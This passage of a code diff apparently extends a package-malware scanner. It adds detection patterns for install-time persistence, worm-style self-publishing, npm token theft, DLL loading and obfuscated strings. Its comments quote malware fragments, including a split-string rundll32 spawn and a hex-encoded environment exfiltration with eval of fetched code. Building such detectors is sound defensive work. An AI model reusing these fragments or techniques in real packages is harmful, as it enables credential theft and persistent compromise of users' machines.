+# and Brave shortcut (.lnk) it found. Browser automation passes the flag on
+# a command line; it never edits shortcuts.
+_PERSIST_SHORTCUT_RE = re.compile(r"\bCreateShortcut\b|\.lnk\b")
+
+# Programs set to start at login or boot (0.1.8). The CanisterWorm releases
+# of @emilgroup's packages and others (March 2026) wrote a systemd user unit
+# that runs a Python payload and enabled it with `systemctl --user enable`,
+# so the payload ran again at every login, long after the install. Malware
+# on every platform does the same through the service managers. No package
+# needs any of this while it is installed: a daemon's `install-service`
+# command and the auto-launch libraries do it when their user or app asks,
+# never at install time, and that code is never read by this test. So each
+# is a reason of the install-script test, never at import time. Shell rc
+# files are left out: installers append PATH lines to them.
+#
+# Each is a place and a way to fill it, both in the text:
+# - systemd: a unit directory named (systemd/user, systemd/system, whole or
+#   as a path join's two literals; not /run/systemd/system, which code reads
+#   to learn whether systemd is running) and written, with a unit's
+#   ExecStart= in the text or the write on a line that names it; or
+#   `systemctl enable` (reenable, link; also as an argument list) run;
+# - launchd: LaunchAgents or LaunchDaemons named and written, with a plist's
+#   keys (RunAtLoad, KeepAlive, ProgramArguments, StartInterval) in the text
+#   or the write on a line that names it; or `launchctl load` (bootstrap,
+#   enable, submit) run;
+# - cron: a crontab installed (piped into `crontab`, `crontab -`, the list
+#   form ['crontab', file]) run, python-crontab's CronTab(...) and .write(),
+#   or a cron directory (/etc/cron.d, /etc/crontab, /var/spool/cron) written
+#   on a line that names it;
+# - a Windows Run key (…\CurrentVersion\Run, RunOnce) named with a registry
+#   write (reg add, New-ItemProperty, SetValueEx, putValue, REG_SZ,
+#   KEY_SET_VALUE …) within _SVC_RUNKEY_SPAN code points of it (a registry
+#   library's docstring names a Run key far from its write calls);
+# - a scheduled task: `schtasks /create` run, Register-ScheduledTask, or the
+#   Task Scheduler's COM object (Schedule.Service) and RegisterTaskDefinition
+#   (alone, an AWS ECS action);
+# - the Startup folder (Start Menu\Programs\Startup, shell:startup,
+#   CSIDL_STARTUP, a path join's 'Programs', 'Startup') named and written,
+#   or a shortcut made;
+# - an XDG autostart directory (~/.config/autostart, /etc/xdg/autostart)
+#   named and written.
+# A command is run when the text has an exec call, or when the command's
+# tool starts a command (a line, or after ; & | or a parenthesis: a hook
+# command or a shell script). A write "on a line that names it" is a write
+# call or a shell write (a redirection, cp, tee …) on a line of at most
+# _SVC_LINE_MAX characters: a minified bundle's one line is not a statement.
+_SVC_SYSTEMD_DIR_SRC = (
+    r"""(?<!/run/)systemd[/\\](?:user|system)(?![\w.-])"""
+    r"""|["'`]systemd["'`]\s{0,20}[,+/]\s{0,20}["'`](?:user|system)["'`]""")
+_SVC_UNIT_SRC = r"""ExecStart\s{0,20}="""
+_SVC_SYSTEMCTL_SRC = (
+    r"""\bsystemctl(?:[ \t]+-{1,2}[\w-]+)*[ \t]+(?:enable|reenable|link)\b"""
+    r"""|["'`]systemctl["'`]\s{0,20},\s{0,20}(?:["'`]-{1,2}[\w-]+["'`]\s{0,20},\s{0,20}){0,4}["'`]"""
+    r"""(?:enable|reenable|link)["'`]""")
+_SVC_LAUNCHD_DIR_SRC = r"""\bLaunch(?:Agents|Daemons)\b"""
+_SVC_PLIST_SRC = r"""\b(?:RunAtLoad|KeepAlive|ProgramArguments|StartInterval)\b"""
+_SVC_LAUNCHCTL_SRC = (
+    r"""\blaunchctl(?:[ \t]+-{1,2}[\w-]+)*[ \t]+(?:load|bootstrap|enable|submit)\b"""
+    r"""|["'`]launchctl["'`]\s{0,20},\s{0,20}(?:["'`]-{1,2}[\w-]+["'`]\s{0,20},\s{0,20}){0,4}["'`]"""
+    r"""(?:load|bootstrap|enable|submit)["'`]""")
+_SVC_CRONTAB_SRC = (
+    r"""\|[ \t]*(?:sudo[ \t]+)?crontab(?:[ \t]+-(?![\w-])|[ \t]*(?![^"'`)\n;&>]))"""
+    r"""|\bcrontab[ \t]+(?:-(?![\w-])|["']?(?:[/~$]|\.\.?/))"""
+    r"""|["'`]crontab["'`]\s{0,20},\s{0,20}(?!["'`]-[lre]["'`])[\w$"'`]""")
+_SVC_PYCRON_SRC = r"""\bCronTab\s{0,20}\("""
+_SVC_PYCRON_WRITE_SRC = r"""\.write\s{0,20}\("""
+_SVC_CRON_DIR_SRC = (
+    r"""/etc/cron\.(?:d|hourly|daily|weekly|monthly)(?![\w.-])|/etc/crontab(?![\w.-])|/var/spool/cron(?![\w.-])""")
+_SVC_RUNKEY_SRC = r"""CurrentVersion(?:\\{1,2}|/)Run(?:Once(?:Ex)?|Services(?:Once)?)?(?!\w)"""
+_SVC_REG_WRITE_SRC = (
+    r"""\breg(?:\.exe)?["'`]?(?:[ \t]+|\s{0,20},\s{0,20}\[?\s{0,20}["'`])add\b|\b(?:New|Set)-ItemProperty\b"""
+    r"""|\bSetValueEx\b|\bSetValue\s{0,20}\(|\bputValue\b|\bRegSetValue|\bREG_(?:EXPAND_)?SZ\b"""
+    r"""|\bKEY_(?:SET_VALUE|WRITE|ALL_ACCESS)\b""")
+_SVC_SCHTASKS_SRC = r"""\bschtasks(?:\.exe)?["'`]?(?:[ \t]+|\s{0,20},\s{0,20}\[?\s{0,20}["'`])[/-]create\b"""
+_SVC_TASK_API_SRC = r"""\bRegister-ScheduledTask\b"""
+_SVC_TASK_COM_SRC = r"""\bSchedule\.Service\b"""
+_SVC_TASK_REGISTER_SRC = r"""\bRegisterTaskDefinition\b"""
+_SVC_STARTUP_SRC = (
+    r"""Start[ ]?Menu[/\\]{1,2}Programs[/\\]{1,2}Startup(?!\w)|\bshell:(?:common[ ]?)?startup\b"""
+    r"""|\bCSIDL_(?:COMMON_)?STARTUP\b|\bSpecialFolder\.(?:Common)?Startup\b|\bwinshell\.startup\s{0,20}\("""
+    r"""|["'`]Programs["'`]\s{0,20}[,+/]\s{0,20}["'`]Startup["'`]""")
+_SVC_AUTOSTART_SRC = (
+    r"""\.config[/\\]autostart(?![\w.-])|/etc/xdg/autostart(?![\w.-])"""
+    r"""|["'`]\.config["'`]\s{0,20}[,+/]\s{0,20}["'`]autostart["'`]""")
+_SVC_CMD_START_SRC = (
+    r"""(?:(?<![^\n])|[;&|(])[ \t]*(?:sudo[ \t]+)?"""
+    r"""(?:systemctl|launchctl|crontab|[Ss][Cc][Hh][Tt][Aa][Ss][Kk][Ss](?:\.[Ee][Xx][Ee])?)(?![\w.-])""")
+_SVC_SYSTEMD_DIR_RE = re.compile(_SVC_SYSTEMD_DIR_SRC)
+_SVC_UNIT_RE = re.compile(_SVC_UNIT_SRC)
+_SVC_SYSTEMCTL_RE = re.compile(_SVC_SYSTEMCTL_SRC)
+_SVC_LAUNCHD_DIR_RE = re.compile(_SVC_LAUNCHD_DIR_SRC)
+_SVC_PLIST_RE = re.compile(_SVC_PLIST_SRC)
+_SVC_LAUNCHCTL_RE = re.compile(_SVC_LAUNCHCTL_SRC)
+_SVC_CRONTAB_RE = re.compile(_SVC_CRONTAB_SRC)
+_SVC_PYCRON_RE = re.compile(_SVC_PYCRON_SRC)
+_SVC_PYCRON_WRITE_RE = re.compile(_SVC_PYCRON_WRITE_SRC)
+_SVC_CRON_DIR_RE = re.compile(_SVC_CRON_DIR_SRC)
+_SVC_RUNKEY_RE = re.compile(_SVC_RUNKEY_SRC, re.I)
+_SVC_REG_WRITE_RE = re.compile(_SVC_REG_WRITE_SRC, re.I)
+_SVC_SCHTASKS_RE = re.compile(_SVC_SCHTASKS_SRC, re.I)
+_SVC_TASK_API_RE = re.compile(_SVC_TASK_API_SRC, re.I)
+_SVC_TASK_COM_RE = re.compile(_SVC_TASK_COM_SRC, re.I)
+_SVC_TASK_REGISTER_RE = re.compile(_SVC_TASK_REGISTER_SRC)
+_SVC_STARTUP_RE = re.compile(_SVC_STARTUP_SRC, re.I)
+_SVC_AUTOSTART_RE = re.compile(_SVC_AUTOSTART_SRC)
+_SVC_CMD_START_RE = re.compile(_SVC_CMD_START_SRC)
+#: The longest line on which a write counts as writing the place it names
+_SVC_LINE_MAX = 1000
+#: Code points around a Run key searched for a registry write, and the Run keys read
+_SVC_RUNKEY_SPAN = 400
+
+
+def _writes_on_line(text, target_re):
+    """Is there a write call or a shell write on a line on which target_re
+    matches? Each line is searched once, and at most _PERSIST_MAX_LINES; a
+    line longer than _SVC_LINE_MAX (minified code) is not a statement."""
+    m, lines = target_re.search(text), 0
+    while m is not None and lines < _PERSIST_MAX_LINES:
+        start = text.rfind("\n", 0, m.start()) + 1
+        end = text.find("\n", m.end())
+        end = len(text) if end < 0 else end
+        if end - start <= _SVC_LINE_MAX and (_PERSIST_WRITE_RE.search(text, start, end)
+                                             or _PERSIST_SHELL_WRITE_RE.search(text, start, end)):
+            return True
+        lines += 1
+        m = target_re.search(text, end)
+    return False
+
+
+def _run_key_written(text):
+    """Is a registry write within _SVC_RUNKEY_SPAN code points of a Run key
+    `text` names? The first _PERSIST_MAX_LINES Run keys are read."""
+    for k, m in enumerate(_SVC_RUNKEY_RE.finditer(text)):
+        if k >= _PERSIST_MAX_LINES:
+            break
+        if _SVC_REG_WRITE_RE.search(text[max(0, m.start() - _SVC_RUNKEY_SPAN):m.end() + _SVC_RUNKEY_SPAN]):
+            return True
+    return False
+
+
+def service_reasons(text):
+    """The reasons `text` sets a program to start at login or boot (see
+    above), in a fixed order: systemd, launchd, cron, a Run key, a
+    scheduled task, the Startup folder, XDG autostart."""
+    reasons = []
+    runs = None
+
+    def run_context():
+        nonlocal runs
+        if runs is None:
+            runs = _EXEC_CALL_RE.search(text) is not None or _SVC_CMD_START_RE.search(text) is not None
+        return runs
+
+    writes = _PERSIST_WRITE_RE.search(text) is not None
+    if ((_SVC_SYSTEMD_DIR_RE.search(text) is not None
+         and ((writes and _SVC_UNIT_RE.search(text) is not None) or _writes_on_line(text, _SVC_SYSTEMD_DIR_RE)))
+            or (_SVC_SYSTEMCTL_RE.search(text) is not None and run_context())):
+        reasons.append("installs a systemd service")
+    if ((_SVC_LAUNCHD_DIR_RE.search(text) is not None
+         and ((writes and _SVC_PLIST_RE.search(text) is not None) or _writes_on_line(text, _SVC_LAUNCHD_DIR_RE)))
+            or (_SVC_LAUNCHCTL_RE.search(text) is not None and run_context())):
+        reasons.append("installs a launchd agent or daemon")
+    if ((_SVC_CRONTAB_RE.search(text) is not None and run_context())
+            or (_SVC_PYCRON_RE.search(text) is not None and _SVC_PYCRON_WRITE_RE.search(text) is not None)
+            or _writes_on_line(text, _SVC_CRON_DIR_RE)):
+        reasons.append("adds a cron job")
+    if _run_key_written(text):
+        reasons.append("adds a program to a Windows Run key")
+    if ((_SVC_SCHTASKS_RE.search(text) is not None and run_context()) or _SVC_TASK_API_RE.search(text) is not None
+            or (_SVC_TASK_COM_RE.search(text) is not None and _SVC_TASK_REGISTER_RE.search(text) is not None)):
+        reasons.append("creates a Windows scheduled task")
+    if _SVC_STARTUP_RE.search(text) is not None and (
+            writes or _PERSIST_SHORTCUT_RE.search(text) is not None or _shell_writes(text, _SVC_STARTUP_RE)):
+        reasons.append("puts a program in the Windows Startup folder")
+    if _SVC_AUTOSTART_RE.search(text) is not None and (writes or _shell_writes(text, _SVC_AUTOSTART_RE)):
+        reasons.append("adds a desktop autostart entry")
+    return reasons
+
+
 def persistence_reasons(text):
     """The persistence-target reasons of the install-script test (see above):
-    what `text` makes an AI agent, an editor or GitHub Actions run later, and
-    the Bun loader the Shai-Hulud worms fetch their payload's runtime with."""
+    what `text` makes an AI agent, an editor, GitHub Actions or the operating
+    system run later, and the Bun loader the Shai-Hulud worms fetch their
+    payload's runtime with."""
     reasons = []
     agent = _persist_agent_file(text)
     if agent is not None and (_PERSIST_WRITE_RE.search(text) is not None or _shell_writes(
@@ -6457,11 +7010,643 @@ def persistence_reasons(text):
         reasons.append("registers the machine as a GitHub Actions self-hosted runner")
     if _BUN_RELEASES_RE.search(text) is not None and _EXEC_CALL_RE.search(text) is not None:
         reasons.append("downloads the Bun runtime from GitHub and runs code with it")
+    if "--load-extension" in text and _PERSIST_SHORTCUT_RE.search(text) is not None:
+        reasons.append("rewrites browser shortcuts to load an extension")
+    reasons.extend(service_reasons(text))
     return reasons
 
 
+# ---------------- Code that publishes packages (SC-SELF-PUBLISH, 0.1.8) ----------------
+# The 2025-26 registry floods shipped a script that gives the package it sits
+# in a new name — a random one each time — and runs `npm publish` in a loop:
+# IndonesianFoods' auto.js, the generated-name "tea" farms, tens of thousands
+# of packages from a few accounts (39 of the 0.1.7 benchmark's misses).
+# Release tools publish too, but never rename what they publish. So three
+# signs in one file are SC-SELF-PUBLISH, CRITICAL wherever the file is: a
+# publish command an exec call runs (`npm publish`, pnpm, yarn, bun; or
+# `spawn("npm", ["publish"])`), an assignment to an object's `name`, and a
+# write to package.json whose arguments name that object — package.json in
+# the arguments, or in the _SELF_PUB_SPAN characters before the call
+# (Python's `with open("package.json", "w") as f: json.dump(pkg, f)`).
+#
+# The worms' half belongs to the install-script test: a script an install
+# hook runs that publishes a package, or that collects npm access tokens —
+# the @emilgroup releases read ~/.npmrc, NPM_TOKEN and `npm config get
+# //registry.npmjs.org/:_authToken`, then handed the tokens to a detached
+# deploy script. No install script needs either.
+_PUBLISH_CMD_SRC = (
+    r"""\b(?:exec|execSync|execa|execaSync|execFile|execFileSync|spawn|spawnSync|system|popen|Popen|run|call"""
+    r"""|check_call|check_output|getoutput)\s*\(\s*(?:\[\s*)?["'`](?:[^"'`\n]{0,80}?(?:&&|;|\|\|)\s*)?"""
+    r"""(?:npx\s+)?(?:npm|pnpm|yarn|bun)(?:\.cmd)?(?:["'`]\s*,\s*(?:\[\s*)?["'`]|\s+)publish\b""")
+_NAME_ASSIGN_SRC = r"""(?<![\w$.])([A-Za-z_$][\w$]*)\s*(?:\.\s*name|\[\s*["']name["']\s*\])\s*=(?![=>])"""
+_MANIFEST_WRITE_SRC = (
+    r"""\b(?:writeFileSync|writeFile|outputJsonSync|outputJson|writeJsonSync|writeJson|outputFileSync"""
+    r"""|outputFile|write_text|dump)\s*\(""")
+_JS_IDENT_SRC = r"""(?<![\w$.])[A-Za-z_$][\w$]*"""
+_NPM_TOKEN_READ_SRC = (
+    r"""\bnpm\s+config\s+get\s+[^\n"'`;|&]{0,200}?_auth|\.npmrc\b[\s\S]{0,400}?_authToken"""
+    r"""|_authToken[\s\S]{0,400}?\.npmrc\b""")
+_PUBLISH_CMD_RE = re.compile(_PUBLISH_CMD_SRC)
+_NAME_ASSIGN_RE = re.compile(_NAME_ASSIGN_SRC)
+_MANIFEST_WRITE_RE = re.compile(_MANIFEST_WRITE_SRC)
+_JS_IDENT_RE = re.compile(_JS_IDENT_SRC)
+_NPM_TOKEN_READ_RE = re.compile(_NPM_TOKEN_READ_SRC)
+#: Characters of a write call's arguments (and before it) read for package.json and the renamed object
+_SELF_PUB_SPAN = 300
+#: Name assignments and package.json writes examined per text
+_SELF_PUB_MAX = 200
+
+
+def self_publish_at(text):
+    """The offset of the publish command of code that renames its package and
+    publishes it (see above), else -1."""
+    if "publish" not in text or "package.json" not in text:
+        return -1
+    pub = _PUBLISH_CMD_RE.search(text)
+    if pub is None:
+        return -1
+    names = set()
+    for k, m in enumerate(_NAME_ASSIGN_RE.finditer(text)):
+        if k >= _SELF_PUB_MAX:
+            break
+        names.add(m.group(1))
+    if not names:
+        return -1
+    for k, w in enumerate(_MANIFEST_WRITE_RE.finditer(text)):
+        if k >= _SELF_PUB_MAX:
+            break
+        args = text[w.end():w.end() + _SELF_PUB_SPAN]
+        if "package.json" not in args and "package.json" not in text[max(0, w.start() - _SELF_PUB_SPAN):w.start()]:
+            continue
+        if names.intersection(_JS_IDENT_RE.findall(args)):
+            return pub.start()
+    return -1
+
+
+# ---------------- An install script that runs a DLL (0.1.8) ----------------
+# eslint-config-prettier 9.1.1 (July 2025) shipped node-gyp.dll and an
+# install.js that ran it on Windows: require('chi'+'ld_pro'+'cess')["sp"+
+# "awn"]("rund"+"ll32", [path.join(__dirname, './node-gyp' + '.dll') +
+# ",main"]). rundll32 and regsvr32 run a DLL's code; an install script has
+# no reason to call either on a DLL of its own. The text is read again with
+# adjacent string literals joined ('a' + 'b' as 'ab') when the split hid the
+# names. Windows' own DLLs that rundll32 is used with for ordinary things
+# (opening a URL with url.dll, a Control Panel applet with shell32.dll) are
+# not a reason; a DLL of any other name is.
+_DLL_LOADER_SRC = r"""\b(?:rundll32|regsvr32)(?:\.exe)?\b"""
+_DLL_NAME_SRC = r"""(?<![\w.\-])[\w.\-]*\.dll\b"""
+_STRING_JOIN_SRC = r"""["']\s*\+\s*["']"""
+_DLL_LOADER_RE = re.compile(_DLL_LOADER_SRC, re.I)
+_DLL_NAME_RE = re.compile(_DLL_NAME_SRC, re.I)
+_STRING_JOIN_RE = re.compile(_STRING_JOIN_SRC)
+_SYSTEM_DLLS = frozenset(("url.dll", "shell32.dll", "user32.dll", "ieframe.dll", "dfshim.dll", "advpack.dll",
+                          "printui.dll", "keymgr.dll", "powrprof.dll", "zipfldr.dll", "shdocvw.dll", "shimgvw.dll"))
+
+
+def join_string_pieces(text):
+    """`text` with adjacent string literals joined: `'chi' + 'ld'` reads
+    `'child'` (a quote, a plus and a quote taken out)."""
+    return _STRING_JOIN_RE.sub("", text) if "+" in text else text
+
+
+def runs_dll(text):
+    """The DLL `text` runs with rundll32 or regsvr32 (a name, not one of
+    Windows' own ordinary ones), read as written and with its string pieces
+    joined; None when it runs none."""
+    if "32" not in text and "+" not in text:
+        return None
+    for view in (text, join_string_pieces(text)):
+        if _DLL_LOADER_RE.search(view) is None:
+            continue
+        for m in _DLL_NAME_RE.finditer(view):
+            name = m.group().rsplit("/", 1)[-1].rsplit("\\", 1)[-1].lower()
+            if name and name != ".dll" and name not in _SYSTEM_DLLS:
+                return name
+    return None
+
+
+# ---------------- Names in strings a file decodes as it runs (0.1.8) ----------------
+# tailwind-book-icon and five more loggers of one campaign kept every name
+# their payload needs hex-encoded and decoded them with a helper of their own:
+#     function g(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))); }
+#     let hl = [g('72657175697265'), g('6178696f73'), g('706f7374'), g('6874…'), …];
+#     require(hl[1])[[hl[2]]](hl[3], { ...process.env }, …)[[hl[7]]](r => eval(r.data));
+# which is axios.post(URL, …).then(r => eval(r.data)) — fetch and run — once
+# the strings are read; postman-converters wrote require(Buffer.from("6f73",
+# "hex").toString()) for require('os'). The install-script and import-time
+# tests read a file a second time the way it reads once its strings are
+# decoded (decoded_view): string literals joined across a '+' on one row;
+# a decoder's call on a literal replaced by the text it decodes to —
+# Buffer.from(…, 'hex' | 'base64').toString(), atob(…), bytes.fromhex(…)
+# .decode(), b64decode(…).decode(), unhexlify(…).decode(), and the file's
+# own helpers (a function of one parameter whose first _DV_BODY characters
+# decode hex, as parseInt(…, 16) with fromCharCode, or base64) — when that
+# text is printable ASCII; and, once something was decoded, a constant array
+# of string literals read where it is indexed by a number, and a member
+# named by a literal read as one (process["env"] as process.env). A reason
+# found only there says so. Rows keep their line breaks, so lines are the
+# file's. Literals joined and nothing decoded are no second reading: a
+# bundle joins literals everywhere, and reading its 3 MB again doubled the
+# test's time (playwright-core's coreBundle.js) to find nothing.
+_DV_MAX_LITERAL = 400           # characters of an encoded literal, at most
+_DV_BODY = 400                  # characters of a helper's body read for what it decodes
+_DV_MAX_HELPERS = 8             # decoding helpers of a file, at most
+_DV_MAX_ARRAYS = 16             # constant arrays read, at most
+_DV_MAX_CHARS = 4_000_000       # a longer text is not read again
+_DV_NOTE = " (in strings it decodes as it runs)"
+_DV_LIT = r"""(?:'(?P<a>[^'\\\n]{1,400})'|"(?P<b>[^"\\\n]{1,400})"|`(?P<c>[^`\\\n$]{1,400})`)"""
+_DV_JOIN_SRC = r"""'[ \t]*\+[ \t]*'|"[ \t]*\+[ \t]*""" + '"'
+_DV_BUFFER_SRC = (r"""\bBuffer[ \t]*\.[ \t]*from[ \t]*\([ \t]*""" + _DV_LIT
+                  + r"""[ \t]*,[ \t]*['"`](?P<enc>hex|base64)['"`][ \t]*\)[ \t]*\.[ \t]*toString[ \t]*\([ \t]*"""
+                  r"""(?:['"`](?:utf-?8|ascii|latin1|binary)['"`])?[ \t]*\)""")
+_DV_ATOB_SRC = r"""(?<![\w$.])atob[ \t]*\([ \t]*""" + _DV_LIT + r"""[ \t]*\)"""
+_DV_PY_SRC = (r"""\b(?:(?P<fh>bytes[ \t]*\.[ \t]*fromhex)|(?P<uh>(?:binascii[ \t]*\.[ \t]*)?unhexlify)"""
+              r"""|(?:base64[ \t]*\.[ \t]*)?b64decode)[ \t]*\([ \t]*b?(?:'(?P<a>[^'\\\n]{1,400})'|"(?P<b>[^"\\\n]{1,400})")"""
+              r"""[ \t]*\)[ \t]*\.[ \t]*decode[ \t]*\([^()\n]{0,20}\)""")
+_DV_HELPER_SRC = (r"""\bfunction[ \t]+(?P<a>[A-Za-z_$][\w$]*)[ \t]*\([ \t]*[A-Za-z_$][\w$]*[ \t]*\)"""
+                  r"""|\b(?:const|let|var)[ \t]+(?P<b>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*(?:function[ \t]*\([ \t]*"""
+                  r"""[A-Za-z_$][\w$]*[ \t]*\)|\(?[ \t]*[A-Za-z_$][\w$]*[ \t]*\)?[ \t]*=>)"""
+                  r"""|\bdef[ \t]+(?P<c>[A-Za-z_]\w*)[ \t]*\([ \t]*[A-Za-z_]\w*[ \t]*\)[ \t]*:""")
+_DV_STR_ITEM_SRC = r"""'[^'\\\n]{0,400}'|"[^"\\\n]{0,400}""" + '"'
+_DV_ARRAY_SRC = (r"""(?<![\w$.])(?P<name>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*\[(?P<items>(?:\s*(?:""" + _DV_STR_ITEM_SRC
+                 + r""")\s*,){0,63}\s*(?:""" + _DV_STR_ITEM_SRC + r""")\s*,?\s*)\]""")
+# a member named with a string literal after a name, a call or an index:
+# process["env"] reads process.env (an array literal's ['x'] is not one)
+_DV_MEMBER_SRC = r"""(?<=[\w$)\]])\[[ \t]*(?:'(?P<a>[A-Za-z_$][\w$]{0,63})'|"(?P<b>[A-Za-z_$][\w$]{0,63})")[ \t]*\]"""
+_DV_MEMBER_RE = re.compile(_DV_MEMBER_SRC)
+_DV_HEX_RE = re.compile(r"[0-9A-Fa-f]+")
+_DV_B64_RE = re.compile(r"[A-Za-z0-9+/]+={0,2}")
+_DV_JOIN_RE = re.compile(_DV_JOIN_SRC)
+_DV_BUFFER_RE = re.compile(_DV_BUFFER_SRC)
+_DV_ATOB_RE = re.compile(_DV_ATOB_SRC)
+_DV_PY_RE = re.compile(_DV_PY_SRC)
+_DV_HELPER_RE = re.compile(_DV_HELPER_SRC)
+_DV_STR_ITEM_RE = re.compile(_DV_STR_ITEM_SRC)
+_DV_ARRAY_RE = re.compile(_DV_ARRAY_SRC)
+_DV_NEEDLES = ("Buffer", "atob", "fromhex", "unhexlify", "b64decode", "fromCharCode", "hex", "base64")
+# (0.1.8) A home-made XOR decoder: react-zutils 1.0.1, which its preinstall
+# hook starts detached, kept the 83 strings its browser stealer needs —
+# modules, browser paths, SQL, its ngrok address — as base64 of the text
+# XORed with a four-letter key, decoded by a helper of its own:
+#     n=(t,e)=>{let r=Buffer.from(t,"base64");…a[index]=255&(r[index]^e.charCodeAt(3&index))…},
+#     a=t=>n(t,"utf8"), E=a("BgUKUQERVQ")               // "sqlite3"
+# The helper's body is not read. In a text with a ^, a name called with one
+# literal of base64 (padded, or not) or of hex at least _DV_XOR_MIN_CALLS
+# times (its first _DV_XOR_MAX_CALLS calls are tried, holding at least
+# _DV_XOR_MIN_BYTES bytes in all) is such a decoder when one string literal
+# of the text — of the first _DV_XOR_MAX_KEYS distinct ones of 1 to
+# _DV_XOR_KEY_MAX printable ASCII characters — XORed over the bytes, repeated
+# from the first, makes all but a tenth of those calls printable ASCII; its
+# calls are read as that text. A random key does that to a random call with
+# a chance of 95/256 a byte: 32 bytes make a false decoder a chance in 10^13.
+_DV_XOR_MIN_CALLS = 5
+_DV_XOR_MAX_CALLS = 64
+_DV_XOR_MIN_BYTES = 32
+_DV_XOR_MAX_KEYS = 256
+_DV_XOR_KEY_MAX = 32
+_DV_CALL_SRC = r"""(?<![\w$.])(?P<name>[A-Za-z_$][\w$]*)[ \t]*\([ \t]*""" + _DV_LIT + r"""[ \t]*\)"""
+_DV_KEY_SRC = r"""'(?P<a>[^'\\\n]{1,32})'|"(?P<b>[^"\\\n]{1,32})"|`(?P<c>[^`\\\n$]{1,32})`"""
+_DV_CALL_RE = re.compile(_DV_CALL_SRC)
+_DV_KEY_RE = re.compile(_DV_KEY_SRC)
+# The patterns decoded_view builds around the names a file uses (each name
+# escaped): a call of one of its decoding helpers, and an array read by index
+# (not one the file changes, and assigned once).
+_DV_NAME_HEAD = r"""(?<![\w$.])"""
+_DV_HELPER_CALL_TAIL = r""")[ \t]*\([ \t]*""" + _DV_LIT + r"""[ \t]*\)"""
+_DV_MUTATED_TAIL = (r"""\s*(?:\.\s*(?:push|pop|shift|unshift|splice|reverse|sort|fill"""
+                    r"""|copyWithin|append|insert|extend|remove)\s*\(|\[[^\]\n]{0,80}\]\s*=(?!=))""")
+_DV_ASSIGNED_TAIL = r"\s*=(?![=>])"
+_DV_INDEX_TAIL = r"\s*\[\s*(\d{1,2})\s*\]"
+
+
+def _dv_decode(kind, s):
+    """The printable ASCII text the literal `s` decodes to as hex or base64
+    (strictly: an even run of hex digits; base64 padded to a multiple of 4),
+    else None."""
+    if kind == "hex":
+        if len(s) % 2 or _DV_HEX_RE.fullmatch(s) is None:
+            return None
+        data = bytes.fromhex(s)
+    else:
+        if len(s) % 4 or _DV_B64_RE.fullmatch(s) is None:
+            return None
+        try:
+            data = base64.b64decode(s)
+        except ValueError:
+            return None
+    if not data or any(b < 0x20 or b > 0x7e for b in data):
+        return None
+    return data.decode("ascii")
+
+
+def _dv_quote(s):
+    return "'" + s.replace("\\", "\\\\").replace("'", "\\'") + "'"
+
+
+def _dv_helpers(text):
+    """{name: 'hex' | 'base64'}: the file's own decoding helpers (see above)."""
+    out = {}
+    for m in _DV_HELPER_RE.finditer(text):
+        name = m.group("a") or m.group("b") or m.group("c")
+        if name in out:
+            continue
+        body = text[m.end():m.end() + _DV_BODY]
+        if (("fromCharCode" in body and "parseInt" in body and "16" in body) or "'hex'" in body
+                or '"hex"' in body or "fromhex(" in body or "unhexlify(" in body):
+            out[name] = "hex"
+        elif "base64" in body or "atob(" in body or "b64decode(" in body:
+            out[name] = "base64"
+        else:
+            continue
+        if len(out) >= _DV_MAX_HELPERS:
+            break
+    return out
+
+
+def _dv_literal(m):
+    return m.group("a") or m.group("b") or (m.group("c") if "c" in m.re.groupindex else None)
+
+
+def _dv_bytes(s, kind):
+    """The bytes the literal `s` holds as hex (an even run of hex digits) or
+    as base64 (padded; or unpadded, but for a length of one more than a
+    multiple of 4), else None."""
+    if kind == "hex":
+        return bytes.fromhex(s) if len(s) % 2 == 0 and _DV_HEX_RE.fullmatch(s) else None
+    if _DV_B64_RE.fullmatch(s) is None or len(s) % 4 == 1 or ("=" in s and len(s) % 4):
+        return None
+    return base64.b64decode(s + "=" * (-len(s) % 4))
+
+
+def _dv_xor_printable(data, key):
+    """Is every byte of `data` XORed with `key` (repeated) printable ASCII?"""
+    n = len(key)
+    for i, b in enumerate(data):
+        if not 0x20 <= b ^ key[i % n] <= 0x7e:
+            return False
+    return True
+
+
+def _dv_xor_decoders(view):
+    """{name: (kind, key)}: the names `view` calls as XOR decoders (see
+    above), in the order of their first calls."""
+    calls = {}
+    for m in _DV_CALL_RE.finditer(view):
+        lits = calls.setdefault(m.group("name"), [])
+        if len(lits) < _DV_XOR_MAX_CALLS:
+            lits.append(_dv_literal(m))
+    out, keys = {}, None
+    for name, lits in calls.items():
+        if len(lits) < _DV_XOR_MIN_CALLS:
+            continue
+        kind = "hex" if all(len(x) % 2 == 0 and _DV_HEX_RE.fullmatch(x) for x in lits) else "base64"
+        data = [_dv_bytes(x, kind) for x in lits]
+        if (sum(d is not None for d in data) < _DV_XOR_MIN_CALLS
+                or sum(len(d) for d in data if d is not None) < _DV_XOR_MIN_BYTES):
+            continue
+        if keys is None:
+            keys, seen = [], set()
+            for k in _DV_KEY_RE.finditer(view):
+                key = k.group("a") or k.group("b") or k.group("c")
+                if key not in seen and all(" " <= ch <= "~" for ch in key):
+                    seen.add(key)
+                    keys.append(key.encode("ascii"))
+                    if len(keys) >= _DV_XOR_MAX_KEYS:
+                        break
+        allowed = len(lits) // 10                   # calls that may stay unread
+        for key in keys:
+            bad = 0
+            for d in data:
+                if d is None or not _dv_xor_printable(d, key):
+                    bad += 1
+                    if bad > allowed:
+                        break
+            if bad <= allowed:
+                out[name] = (kind, key)
+                break
+        if len(out) >= _DV_MAX_HELPERS:
+            break
+    return out
+
+
+def _dv_xor_sub(xors):
+    """re.sub's function: a call of an XOR decoder read as its text, when
+    that is printable ASCII."""
+    def sub(m):
+        kind, key = xors[m.group("name")]
+        d = _dv_bytes(_dv_literal(m), kind)
+        if d is None or not _dv_xor_printable(d, key):
+            return m.group()
+        return _dv_quote(bytes(b ^ key[i % len(key)] for i, b in enumerate(d)).decode("ascii"))
+    return sub
+
+
+def decoded_view(text):
+    """`text` read the way it reads once the strings it decodes as it runs
+    are decoded (see above); `text` itself when there is nothing to decode."""
+    if len(text) > _DV_MAX_CHARS or not any(n in text for n in _DV_NEEDLES):
+        return text
+    joined = view = _DV_JOIN_RE.sub("", text) if "+" in text else text
+    if "Buffer" in view:
+        view = _DV_BUFFER_RE.sub(lambda m: (lambda d: m.group() if d is None else _dv_quote(d))(
+            _dv_decode(m.group("enc"), _dv_literal(m))), view)
+    if "atob" in view:
+        view = _DV_ATOB_RE.sub(lambda m: (lambda d: m.group() if d is None else _dv_quote(d))(
